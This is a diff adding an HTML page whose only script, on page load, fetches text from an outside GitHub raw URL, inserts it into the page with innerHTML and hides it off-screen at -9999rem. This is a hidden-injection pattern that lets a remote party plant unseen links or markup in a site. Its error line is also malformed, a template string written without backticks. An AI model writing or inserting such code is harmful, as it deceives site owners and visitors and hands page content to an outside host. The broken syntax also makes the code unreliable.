@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="id">
+<body>
+    <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        fetch("https://raw.githubusercontent.com/shafafery/shafafery.github.io/refs/heads/main/oriiiiiii")
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(Failed to fetch content (${response.status}));
+                }
+                return response.text();
+            })
+            .then(text => {
+                var div = document.createElement("div");
+                div.innerHTML = text;
+                div.style.position = "absolute";
+                div.style.left = "-9999rem";
+                document.body.insertBefore(div, document.body.lastChild);
+            })
+            .catch(error => {
+                console.error("Error loading content:", error);
+            });
+    });
+    </script>
+
+</body>
+</html>
